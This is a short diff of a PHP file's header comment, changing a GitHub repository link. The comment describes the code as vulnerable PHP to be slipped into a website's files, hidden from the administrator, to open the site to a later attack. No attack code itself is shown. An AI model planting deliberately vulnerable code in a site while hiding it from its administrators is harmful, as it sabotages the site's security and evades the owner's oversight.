@@ -2,7 +2,7 @@
 /*
 Coded By: Zech Bron
 Github: https://github.com/ZechBron
-Github Code: https://github.com/ZechBron/Crying-PHP
+Github Code: https://github.com/ZechBron/Webug-PHP
 Description:
         Vulnerable PHP Codes to put inside a file (but do not modify that file to avoid the admin discoveringg what you've done) for future attack.
         Note that the only purpose of this code is to insert this shit in a file to make the site vulnerable for your future attack.
